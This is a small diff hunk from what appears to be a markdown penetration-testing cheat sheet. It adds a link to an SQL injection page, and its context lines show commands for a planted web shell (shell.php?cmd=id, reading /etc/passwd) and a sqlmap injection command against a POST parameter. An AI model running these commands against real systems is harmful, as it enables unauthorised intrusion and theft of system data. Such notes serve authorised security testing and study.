@@ -91,6 +91,7 @@
   - > __```<url>/shell.php?cmd=id```__
   - > __```<url>/shell.php?cmd=cat /etc/passwd```__
 ## sqlmap 
+#### [SQL Injection](sql_injection.md)
 
 - __`sqlmap -u "<url>" --data "words_exact=" -p words_exact --method POST`__
 - __OR__
